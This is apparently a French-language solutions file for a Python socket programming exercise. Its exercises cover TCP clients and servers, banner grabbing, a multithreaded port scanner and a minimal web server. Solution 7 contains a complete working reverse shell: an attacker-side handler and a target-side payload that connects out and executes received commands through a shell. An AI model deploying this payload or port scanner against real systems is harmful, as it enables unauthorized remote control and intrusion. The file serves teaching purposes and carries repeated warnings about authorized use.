================================================================================
```python
                   SOLUTIONS - EXERCICE 14 - SOCKETS TCP
```
================================================================================

AVERTISSEMENT : Ces solutions sont fournies à des fins éducatives uniquement.
L'utilisation de ces techniques sans autorisation est ILLÉGALE.

================================================================================
SOLUTION 1 : CLIENT TCP BASIQUE
================================================================================

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

```python
import socket

def client_tcp_basique(host, port):
    """
    Client TCP qui se connecte à un serveur web et effectue une requête GET.
    """
    try:
        # Création du socket TCP
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Configuration du timeout
        client.settimeout(5)

        print(f"Connexion à {host}:{port}...")

        # Connexion au serveur
        client.connect((host, port))
        print("Connecté avec succès !\n")

        # Préparation de la requête HTTP GET
        request = f"GET / HTTP/1.1\r\n"
        request += f"Host: {host}\r\n"
        request += "Connection: close\r\n"
        request += "\r\n"

        print("Envoi de la requête GET...")

        # Envoi de la requête
        client.sendall(request.encode('utf-8'))

        print("Réception de la réponse...\n")

        # Réception de la réponse complète
        response = b""
        total_bytes = 0

        while True:
            # Réception par chunks de 4096 octets
            chunk = client.recv(4096)

            # Si aucune donnée reçue, la connexion est fermée
            if not chunk:
                break

            response += chunk
            total_bytes += len(chunk)

        # Affichage de la réponse
        print(response.decode('utf-8', errors='ignore'))

        print(f"\nTotal reçu : {total_bytes} octets")

        # Fermeture du socket
        client.close()
        print("Socket fermé")

        return True

    except socket.timeout:
        print("ERREUR : Timeout de connexion (5 secondes dépassées)")
        return False

    except ConnectionRefusedError:
        print("ERREUR : Connexion refusée (serveur inaccessible)")
        return False

    except socket.gaierror:
        print("ERREUR : Impossible de résoudre le nom de domaine")
        return False

    except Exception as e:
        print(f"ERREUR : {e}")
        return False

    finally:
        # S'assurer que le socket est fermé même en cas d'erreur
        try:
            client.close()
        except:
            pass

```
# Utilisation
```python
if __name__ == "__main__":
    client_tcp_basique("example.com", 80)

```
================================================================================
SOLUTION 2 : SERVEUR ECHO TCP
================================================================================

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

```python
import socket
import sys

def serveur_echo(host, port):
    """
    Serveur TCP echo qui renvoie les messages reçus avec le préfixe 'ECHO: '.
    """
    # Création du socket serveur
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Activer SO_REUSEADDR pour réutiliser l'adresse immédiatement
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        # Liaison à l'adresse et au port
        server.bind((host, port))

        # Mise en écoute (backlog de 5 connexions)
        server.listen(5)

        print(f"[*] Serveur echo démarré sur {host}:{port}")
        print(f"[*] En attente de connexions...\n")

        while True:
            try:
                # Acceptation d'une connexion entrante
                client_socket, client_address = server.accept()

                print(f"[+] Client connecté : {client_address[0]}:{client_address[1]}")

                try:
                    while True:
                        # Réception des données (buffer de 1024 octets)
                        data = client_socket.recv(1024)

                        # Si aucune donnée, le client s'est déconnecté
                        if not data:
                            break

                        # Décodage du message
                        message = data.decode('utf-8', errors='ignore').strip()
                        print(f"[>] Reçu : \"{message}\"")

                        # Préparation de la réponse echo
                        echo_response = f"ECHO: {message}\n"

                        # Envoi de la réponse
                        client_socket.sendall(echo_response.encode('utf-8'))
                        print(f"[<] Envoyé : \"{echo_response.strip()}\"")

                except Exception as e:
                    print(f"[!] Erreur lors de la communication : {e}")

                finally:
                    # Fermeture de la connexion client
                    client_socket.close()
                    print(f"[-] Client déconnecté\n")

            except KeyboardInterrupt:
                print("\n[*] Interruption détectée...")
                break

    except socket.error as e:
        print(f"[!] Erreur serveur : {e}")

    finally:
        # Fermeture du socket serveur
        server.close()
        print("[*] Serveur arrêté")

```
# Utilisation
```python
if __name__ == "__main__":
    try:
        serveur_echo("0.0.0.0", 8888)
    except KeyboardInterrupt:
        print("\n[*] Arrêt du serveur...")
        sys.exit(0)

```
# CLIENT DE TEST pour le serveur echo
```python
def client_test_echo(host, port, message):
    """Client pour tester le serveur echo."""
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host, port))

        print(f"Connecté à {host}:{port}")
        print(f"Envoi : {message}")

        client.sendall(message.encode('utf-8'))

        response = client.recv(1024)
        print(f"Reçu : {response.decode('utf-8')}")

        client.close()

    except Exception as e:
        print(f"Erreur : {e}")

```
================================================================================
SOLUTION 3 : BANNER GRABBER
================================================================================

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

```python
import socket
import time
import re

def grab_banner(target_ip, target_port, timeout=3):
    """
    Récupère le banner d'un service réseau.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)

        # Connexion au service
        sock.connect((target_ip, target_port))

        # Certains services envoient automatiquement leur banner
        banner = sock.recv(1024)

        # Si pas de banner automatique, essayer d'envoyer une requête
        if not banner:
            sock.send(b"\r\n")
            time.sleep(0.5)
            banner = sock.recv(1024)

        sock.close()

        return banner.decode('utf-8', errors='ignore').strip()

    except socket.timeout:
        return None
    except socket.error:
        return None
    except Exception:
        return None

def analyser_banner(banner):
    """
    Analyse le banner pour identifier le service et extraire les informations.
    """
    if not banner:
        return {
            "service": "unknown",
            "produit": "unknown",
            "version": "unknown",
            "os": "unknown"
        }

    info = {
        "service": "unknown",
        "produit": "unknown",
        "version": "unknown",
        "os": "unknown"
    }

    # Détection SSH
    if "SSH" in banner:
        info["service"] = "SSH"

        # Extraction version : SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
        match = re.search(r'SSH-[\d.]+-(\w+)_([\d.p]+)', banner)
        if match:
            info["produit"] = match.group(1)
            info["version"] = match.group(2)

        # Détection OS
        if "Ubuntu" in banner:
            info["os"] = "Ubuntu"
        elif "Debian" in banner:
            info["os"] = "Debian"
        elif "Windows" in banner:
            info["os"] = "Windows"

    # Détection FTP
    elif "FTP" in banner:
        info["service"] = "FTP"

        # Extraction version : 220 ProFTPD 1.3.5 Server
        match = re.search(r'(\w+FTP[Dd]?)\s+([\d.]+)', banner)
        if match:
            info["produit"] = match.group(1)
            info["version"] = match.group(2)

    # Détection HTTP
    elif "HTTP" in banner or "Server:" in banner:
        info["service"] = "HTTP"

        # Extraction serveur : Server: nginx/1.18.0
        match = re.search(r'Server:\s*(\w+)/([\d.]+)', banner)
        if match:
            info["produit"] = match.group(1)
            info["version"] = match.group(2)

    # Détection SMTP
    elif banner.startswith("220"):
        info["service"] = "SMTP"

        # Extraction : 220 mail.example.com ESMTP Postfix
        match = re.search(r'ESMTP\s+(\w+)', banner)
        if match:
            info["produit"] = match.group(1)

    # Détection POP3
    elif banner.startswith("+OK"):
        info["service"] = "POP3"

        # Extraction : +OK Dovecot ready.
        if "Dovecot" in banner:
            info["produit"] = "Dovecot"

    # Détection MySQL
    elif len(banner) > 0 and banner[0] in ['\x00', '\x0a']:
        info["service"] = "MySQL"

    return info

def banner_grabber(target_ip, target_port):
    """
    Outil complet de banner grabbing avec analyse.
    """
    print("=== BANNER GRABBING ===\n")
    print(f"Cible : {target_ip}:{target_port}")
    print(f"Timeout : 3s\n")

    start_time = time.time()

    # Vérifier si le port est ouvert
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_ip, target_port))
        sock.close()

        if result != 0:
            print("[-] Port fermé ou filtré")
            return

        print("[+] Port ouvert")

    except Exception as e:
        print(f"[!] Erreur : {e}")
        return

    # Récupération du banner
    banner = grab_banner(target_ip, target_port)

    if banner:
        print("[+] Banner récupéré :")
        print(banner)
        print()

        # Analyse du banner
        info = analyser_banner(banner)

        print("[*] Analyse :")
        print(f"    Service : {info['service']}")
        print(f"    Produit : {info['produit']}")
        print(f"    Version : {info['version']}")
        print(f"    OS      : {info['os']}")
    else:
        print("[-] Aucun banner récupéré")

    elapsed_time = time.time() - start_time
    print(f"\nTemps écoulé : {elapsed_time:.2f}s")

```
# Utilisation
```python
if __name__ == "__main__":
    # Test sur scanme.nmap.org (autorisé pour tests)
    print("Test sur scanme.nmap.org (autorisé)\n")

    banner_grabber("scanme.nmap.org", 22)   # SSH
    print("\n" + "="*60 + "\n")
    banner_grabber("scanme.nmap.org", 80)   # HTTP

```
================================================================================
SOLUTION 4 : SCANNER DE PORTS MULTI-THREADING
================================================================================

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

```python
import socket
import threading
import time
from queue import Queue

class PortScanner:
    """Scanner de ports avec multithreading."""

    def __init__(self, target_ip, ports, max_threads=50, timeout=0.5):
        self.target_ip = target_ip
        self.ports = ports
        self.max_threads = max_threads
        self.timeout = timeout

        self.queue = Queue()
        self.results = []
        self.lock = threading.Lock()
        self.scanned = 0
        self.total_ports = len(ports)

    def scan_port(self, port):
        """Scanne un port spécifique."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)

            result = sock.connect_ex((self.target_ip, port))

            sock.close()

            if result == 0:
                # Port ouvert - tenter de récupérer le banner
                banner = self.grab_banner(port)

                with self.lock:
                    self.results.append({
                        "port": port,
                        "status": "open",
                        "banner": banner
                    })

        except:
            pass

        finally:
            with self.lock:
                self.scanned += 1

    def grab_banner(self, port):
        """Récupère le banner d'un port ouvert."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target_ip, port))

            banner = sock.recv(1024)
            sock.close()

            if banner:
                return banner.decode('utf-8', errors='ignore').strip()
            return None

        except:
            return None

    def worker(self):
        """Thread worker qui traite la queue."""
        while True:
            port = self.queue.get()

            if port is None:
                break

            self.scan_port(port)
            self.queue.task_done()

    def scan(self):
        """Lance le scan complet."""
        print(f"=== SCANNER DE PORTS ===\n")
        print(f"Cible    : {self.target_ip}")
        print(f"Ports    : {min(self.ports)}-{max(self.ports)}")
        print(f"Threads  : {self.max_threads}")
        print(f"Timeout  : {self.timeout}s\n")

        # Remplir la queue avec les ports à scanner
        for port in self.ports:
            self.queue.put(port)

        # Créer et démarrer les threads
        threads = []
        for _ in range(self.max_threads):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)

        print("Scan en cours...")

        start_time = time.time()

        # Afficher la progression
        while self.scanned < self.total_ports:
            progress = (self.scanned / self.total_ports) * 100
            bar_length = 40
            filled = int(bar_length * progress / 100)
            bar = '█' * filled + ' ' * (bar_length - filled)

            print(f'\r[{bar}] {progress:.0f}% ({self.scanned}/{self.total_ports})', end='')
            time.sleep(0.1)

        print(f'\r[{"█" * bar_length}] 100% ({self.total_ports}/{self.total_ports})')

        # Attendre la fin de tous les scans
        self.queue.join()

        # Arrêter les threads
        for _ in range(self.max_threads):
            self.queue.put(None)

        for t in threads:
            t.join()

        elapsed_time = time.time() - start_time

        # Afficher les résultats
        self.display_results(elapsed_time)

    def display_results(self, elapsed_time):
        """Affiche les résultats du scan."""
        print("\n\n=== RÉSULTATS ===\n")

        # Trier les résultats par port
        self.results.sort(key=lambda x: x["port"])

        print(f"Ports ouverts : {len(self.results)}\n")

        if self.results:
            # Services connus
            services = {
                21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
                53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
                443: "HTTPS", 445: "SMB", 3306: "MySQL",
                3389: "RDP", 8080: "HTTP-Alt"
            }

            print(f"{'Port':<6} {'Service':<12} {'Banner':<50}")
            print(f"{'-'*6} {'-'*12} {'-'*50}")

            for result in self.results:
                port = result["port"]
                service = services.get(port, "Unknown")
                banner = result["banner"][:50] if result["banner"] else "[No banner]"

                print(f"{port:<6} {service:<12} {banner}")

        print(f"\nTemps total : {elapsed_time:.2f}s")
        print(f"Ports/sec   : {self.total_ports / elapsed_time:.2f}")

```
# Utilisation
```python
if __name__ == "__main__":
    # Ports communs à scanner
    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080]

    # Scanner localhost (sûr pour les tests)
    scanner = PortScanner("127.0.0.1", common_ports, max_threads=50, timeout=0.5)
    scanner.scan()

    # Pour scanner une plage complète (exemple) :
    # all_ports = list(range(1, 1001))
    # scanner = PortScanner("192.168.1.1", all_ports, max_threads=100, timeout=0.3)
    # scanner.scan()

```
================================================================================
SOLUTION 5 : CLIENT HTTP PERSONNALISÉ
================================================================================

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

```python
import socket
import time
from urllib.parse import urlparse

class HTTPClient:
    """Client HTTP personnalisé bas niveau."""

    def __init__(self, timeout=10):
        self.timeout = timeout

    def request(self, url, method="GET", headers=None, body=None):
        """
        Effectue une requête HTTP.

        Args:
            url (str): URL complète
            method (str): Méthode HTTP (GET, POST, PUT, DELETE)
            headers (dict): Headers personnalisés
            body (str): Corps de la requête (pour POST/PUT)
        """
        print("=== CLIENT HTTP PERSONNALISÉ ===\n")

        # Parser l'URL
        parsed = urlparse(url)

        host = parsed.hostname
        port = parsed.port or 80
        path = parsed.path or "/"

        if parsed.query:
            path += f"?{parsed.query}"

        print(f"URL    : {url}")
        print(f"Method : {method}")

        # Préparer les headers par défaut
        default_headers = {
            "Host": host,
            "User-Agent": "CustomHTTPClient/1.0",
            "Connection": "close"
        }

        # Ajouter les headers personnalisés
        if headers:
            default_headers.update(headers)

        # Ajouter Content-Length pour POST/PUT
        if body and method in ["POST", "PUT"]:
            if isinstance(body, str):
                body = body.encode('utf-8')
            default_headers["Content-Length"] = str(len(body))

        print("Headers:")
        for key, value in default_headers.items():
            print(f"  {key}: {value}")

        if body:
            print(f"\nBody:")
            print(body if isinstance(body, str) else body.decode('utf-8'))

        # Construire la requête HTTP
        request = f"{method} {path} HTTP/1.1\r\n"

        for key, value in default_headers.items():
            request += f"{key}: {value}\r\n"

        request += "\r\n"

        if body:
            if isinstance(body, str):
                request += body
            else:
                request = request.encode('utf-8') + body

        # Afficher la requête
        print("\n--- REQUÊTE ENVOYÉE ---")
        print(request if isinstance(request, str) else request.decode('utf-8', errors='ignore'))

        # Envoyer la requête
        start_time = time.time()

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)

            sock.connect((host, port))

            if isinstance(request, str):
                sock.sendall(request.encode('utf-8'))
            else:
                sock.sendall(request)

            # Recevoir la réponse
            response = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk

            sock.close()

            elapsed_time = time.time() - start_time

            # Parser la réponse
            self.parse_response(response, elapsed_time)

        except socket.timeout:
            print("\n[!] ERREUR : Timeout")
        except Exception as e:
            print(f"\n[!] ERREUR : {e}")

    def parse_response(self, response, elapsed_time):
        """Parse et affiche la réponse HTTP."""
        print("\n--- RÉPONSE REÇUE ---")

        response_text = response.decode('utf-8', errors='ignore')

        # Séparer headers et body
        parts = response_text.split('\r\n\r\n', 1)

        if len(parts) == 2:
            headers_section, body = parts
        else:
            headers_section = response_text
            body = ""

        # Afficher tout
        print(response_text)

        # Parser le status code
        lines = headers_section.split('\r\n')
        if lines:
            status_line = lines[0]
            print(f"\nStatus : {status_line.split(' ', 1)[1] if ' ' in status_line else 'Unknown'}")

        print(f"Temps  : {elapsed_time:.3f}s")

```
# Utilisation
```python
if __name__ == "__main__":
    client = HTTPClient(timeout=10)

    # Requête GET simple
    print("=== TEST 1 : GET simple ===\n")
    client.request("http://example.com/")

    print("\n\n" + "="*80 + "\n\n")

    # Requête POST avec body et headers personnalisés
    print("=== TEST 2 : POST avec body ===\n")

    custom_headers = {
        "Content-Type": "application/json",
        "Accept": "application/json"
    }

    body = '{"username": "test", "email": "test@test.com"}'

    # Note : Ceci échouera car example.com n'a pas d'API
    # C'est juste pour montrer le format
    client.request(
        "http://example.com/api/users",
        method="POST",
        headers=custom_headers,
        body=body
    )

```
================================================================================
SOLUTION 6 : SERVEUR WEB MINIMAL
================================================================================

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

```python
import socket
import threading
import os
from datetime import datetime
import mimetypes

class MinimalWebServer:
    """Serveur web HTTP minimal."""

    def __init__(self, host="0.0.0.0", port=8080, document_root="./www"):
        self.host = host
        self.port = port
        self.document_root = document_root
        self.server_socket = None

        # S'assurer que le dossier www existe
        if not os.path.exists(document_root):
            os.makedirs(document_root)
            # Créer un index.html par défaut
            with open(os.path.join(document_root, "index.html"), "w") as f:
                f.write("<html><body><h1>Minimal Web Server</h1></body></html>")

    def start(self):
        """Démarre le serveur."""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)

            print("=== SERVEUR WEB MINIMAL ===\n")
            print(f"Document root : {self.document_root}")
            print(f"Adresse       : {self.host}:{self.port}\n")
            print("[*] Serveur démarré")
            print("[*] En attente de connexions...\n")

            while True:
                client_socket, client_address = self.server_socket.accept()

                # Traiter chaque client dans un thread séparé
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address)
                )
                client_thread.start()

        except KeyboardInterrupt:
            print("\n[*] Arrêt du serveur...")
        finally:
            self.server_socket.close()

    def handle_client(self, client_socket, client_address):
        """Gère une connexion client."""
        try:
            # Recevoir la requête
            request_data = client_socket.recv(4096).decode('utf-8', errors='ignore')

            if not request_data:
                return

            # Parser la requête HTTP
            request_lines = request_data.split('\r\n')
            request_line = request_lines[0]

            # Extraire méthode, path, version
            parts = request_line.split()

            if len(parts) != 3:
                self.send_response(client_socket, 400, "Bad Request")
                return

            method, path, version = parts

            # Logger la requête
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # Traiter uniquement les requêtes GET
            if method != "GET":
                status_code = 405
                self.send_response(client_socket, status_code, "Method Not Allowed")
                print(f"[{timestamp}] {client_address[0]} - \"{request_line}\" {status_code} 0")
                return

            # Servir le fichier
            status_code, content = self.serve_file(path)

            self.send_response(client_socket, status_code, content)

            # Logger
            content_length = len(content) if isinstance(content, bytes) else len(content.encode('utf-8'))
            print(f"[{timestamp}] {client_address[0]} - \"{request_line}\" {status_code} {content_length}")

        except Exception as e:
            print(f"[!] Erreur : {e}")
        finally:
            client_socket.close()

    def serve_file(self, path):
        """
        Sert un fichier depuis le document root.

        Returns:
            tuple: (status_code, content)
        """
        # Nettoyer le path
        if path == "/":
            path = "/index.html"

        # Construire le chemin complet
        file_path = os.path.join(self.document_root, path.lstrip('/'))

        # Vérifier que le fichier est dans le document root (sécurité)
        real_path = os.path.realpath(file_path)
        real_root = os.path.realpath(self.document_root)

        if not real_path.startswith(real_root):
            return 403, "<html><body><h1>403 Forbidden</h1></body></html>"

        # Vérifier si le fichier existe
        if not os.path.exists(file_path):
            return 404, "<html><body><h1>404 Not Found</h1></body></html>"

        # Vérifier si c'est un fichier (pas un dossier)
        if not os.path.isfile(file_path):
            return 403, "<html><body><h1>403 Forbidden</h1></body></html>"

        # Lire le fichier
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
            return 200, content
        except:
            return 500, "<html><body><h1>500 Internal Server Error</h1></body></html>"

    def send_response(self, client_socket, status_code, content):
        """Envoie une réponse HTTP."""
        # Status messages
        status_messages = {
            200: "OK",
            403: "Forbidden",
            404: "Not Found",
            405: "Method Not Allowed",
            500: "Internal Server Error"
        }

        status_message = status_messages.get(status_code, "Unknown")

        # Construire la réponse
        response = f"HTTP/1.1 {status_code} {status_message}\r\n"

        # Headers
        response += f"Date: {datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')}\r\n"
        response += "Server: MinimalWebServer/1.0\r\n"

        # Content-Type
        if isinstance(content, bytes):
            content_type = "application/octet-stream"
        else:
            content_type = "text/html; charset=utf-8"

        response += f"Content-Type: {content_type}\r\n"

        # Content-Length
        content_length = len(content) if isinstance(content, bytes) else len(content.encode('utf-8'))
        response += f"Content-Length: {content_length}\r\n"

        response += "Connection: close\r\n"
        response += "\r\n"

        # Envoyer les headers
        client_socket.sendall(response.encode('utf-8'))

        # Envoyer le body
        if isinstance(content, bytes):
            client_socket.sendall(content)
        else:
            client_socket.sendall(content.encode('utf-8'))

```
# Utilisation
```python
if __name__ == "__main__":
    server = MinimalWebServer(host="0.0.0.0", port=8080, document_root="./www")

    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[*] Arrêt du serveur...")

```
================================================================================
SOLUTION 7 : REVERSE SHELL (ÉDUCATIF)
================================================================================

# ============================================================================
# HANDLER (Serveur - Machine de l'attaquant)
# ============================================================================

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
REVERSE SHELL HANDLER

AVERTISSEMENT : Outil éducatif uniquement !
Utilisation illégale sur des systèmes non autorisés.
"""

```python
import socket
import sys

def reverse_shell_handler(listen_port=4444):
    """Handler qui écoute les connexions reverse shell."""

    print("=== REVERSE SHELL HANDLER ===\n")
    print("AVERTISSEMENT : Outil éducatif uniquement !\n")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind(("0.0.0.0", listen_port))
        server.listen(1)

        print(f"[*] Écoute sur 0.0.0.0:{listen_port}...")

        client, addr = server.accept()
        print(f"[+] Connexion reverse shell reçue de {addr[0]}:{addr[1]}\n")

        while True:
            try:
                # Afficher le prompt
                command = input("shell> ")

                # Commandes spéciales
                if command.lower() in ["exit", "quit"]:
                    print("[*] Fermeture de la session...")
                    break

                if not command.strip():
                    continue

                # Envoyer la commande
                client.send(command.encode('utf-8') + b"\n")

                # Recevoir le résultat
                client.settimeout(10)
                output = b""

                while True:
                    try:
                        chunk = client.recv(4096)
                        if not chunk:
                            break
                        output += chunk

                        # Si fin du output (marqueur ou timeout)
                        if len(chunk) < 4096:
                            break
                    except socket.timeout:
                        break

                if output:
                    print(output.decode('utf-8', errors='ignore'))
                else:
                    print("[!] Aucune sortie reçue")

            except KeyboardInterrupt:
                print("\n[*] Interruption...")
                break
            except Exception as e:
                print(f"[!] Erreur : {e}")
                break

        client.close()
        print("[*] Session terminée")

    except Exception as e:
        print(f"[!] Erreur : {e}")
    finally:
        server.close()

if __name__ == "__main__":
    try:
        port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
        reverse_shell_handler(port)
    except KeyboardInterrupt:
        print("\n[*] Arrêt...")

```
# ============================================================================
# CLIENT (Payload - Machine cible)
# ============================================================================

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
REVERSE SHELL CLIENT

AVERTISSEMENT : Outil éducatif uniquement !
Utilisation illégale sur des systèmes non autorisés.
"""

```python
import socket
import subprocess
import sys

def reverse_shell_client(handler_ip, handler_port=4444):
    """Client reverse shell qui se connecte au handler."""

    print("=== REVERSE SHELL CLIENT ===\n")
    print("AVERTISSEMENT : Outil éducatif uniquement !\n")

    try:
        print(f"[*] Connexion au handler {handler_ip}:{handler_port}...")

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((handler_ip, handler_port))

        print("[+] Connecté !")
        print("[*] En attente de commandes...\n")

        while True:
            # Recevoir la commande
            command = client.recv(1024).decode('utf-8', errors='ignore').strip()

            if not command:
                print("[!] Connexion perdue")
                break

            print(f"[>] Commande reçue : {command}")

            # Commandes spéciales
            if command.lower() in ["exit", "quit"]:
                print("[*] Arrêt demandé")
                break

            # Exécuter la commande
            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )

                output = result.stdout + result.stderr

                if not output:
                    output = "[Commande exécutée sans sortie]\n"

            except subprocess.TimeoutExpired:
                output = "[!] Timeout de la commande\n"
            except Exception as e:
                output = f"[!] Erreur : {e}\n"

            # Envoyer le résultat
            client.send(output.encode('utf-8'))
            print(f"[<] Résultat envoyé ({len(output)} octets)")

        client.close()
        print("[*] Déconnexion")

    except ConnectionRefusedError:
        print("[!] Impossible de se connecter au handler")
    except Exception as e:
        print(f"[!] Erreur : {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 reverse_shell_client.py <handler_ip> [handler_port]")
        sys.exit(1)

    handler_ip = sys.argv[1]
    handler_port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444

    try:
        reverse_shell_client(handler_ip, handler_port)
    except KeyboardInterrupt:
        print("\n[*] Arrêt...")

```
================================================================================
SOLUTION 8 : FRAMEWORK DE RECONNAISSANCE RÉSEAU
================================================================================

(Suite dans la partie suivante en raison de la longueur...)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
FRAMEWORK DE RECONNAISSANCE RÉSEAU

AVERTISSEMENT : Utilisation autorisée uniquement !
"""

```python
import socket
import threading
import time
import json
from queue import Queue
from datetime import datetime
import subprocess
import sys

```
# (Le code complet du framework serait trop long pour cette solution)
# Voici la structure principale :

```python
class NetworkReconFramework:
    """Framework complet de reconnaissance réseau."""

    def __init__(self, config):
        self.config = config
        self.hosts = []
        self.results = {
            "scan_info": {},
            "hosts": []
        }

    def run(self):
        """Lance le scan complet."""
        print("╔═══════════════════════════════════════════════════════════════╗")
        print("║          FRAMEWORK DE RECONNAISSANCE RÉSEAU v1.0              ║")
        print("╠═══════════════════════════════════════════════════════════════╣")
        print("║  AVERTISSEMENT : Utilisation autorisée uniquement !           ║")
        print("╚═══════════════════════════════════════════════════════════════╝")

        # Phase 1 : Découverte d'hôtes
        self.discover_hosts()

        # Phase 2 : Scan de ports
        self.scan_ports()

        # Phase 3 : Banner grabbing
        self.grab_banners()

        # Génération du rapport
        self.generate_report()

    def discover_hosts(self):
        """Découverte d'hôtes actifs."""
        pass

    def scan_ports(self):
        """Scan de ports sur les hôtes actifs."""
        pass

    def grab_banners(self):
        """Récupération des banners."""
        pass

    def generate_report(self):
        """Génère le rapport final."""
        pass

```
# Utilisation
```python
if __name__ == "__main__":
    config = {
        "target": "192.168.1.0/24",
        "ports": [21, 22, 23, 25, 80, 443, 3306, 3389, 8080],
        "threads": 50,
        "timeout": 1
    }

    framework = NetworkReconFramework(config)
    framework.run()

```
================================================================================
```python
                            FIN DES SOLUTIONS
```
================================================================================

NOTES IMPORTANTES :

1. Ces solutions sont des exemples éducatifs
2. Testez UNIQUEMENT sur vos propres systèmes ou avec autorisation
3. Certains exemples nécessitent des ajustements pour votre environnement
4. Les outils de red teaming doivent être utilisés de manière éthique
5. Consultez toujours les lois locales avant d'utiliser ces outils

## Conseils :

- Commencez par les solutions simples (1-3)
- Testez sur localhost avant des cibles réelles
- Lisez la documentation Python socket
- Pratiquez dans des environnements de lab (VirtualBox, Docker)
- Étudiez les protocoles réseau (RFC)

RESSOURCES :

- Documentation Python socket : https://docs.python.org/3/library/socket.html
- OWASP Testing Guide
- HackTheBox, TryHackMe pour la pratique
- Black Hat Python (livre)
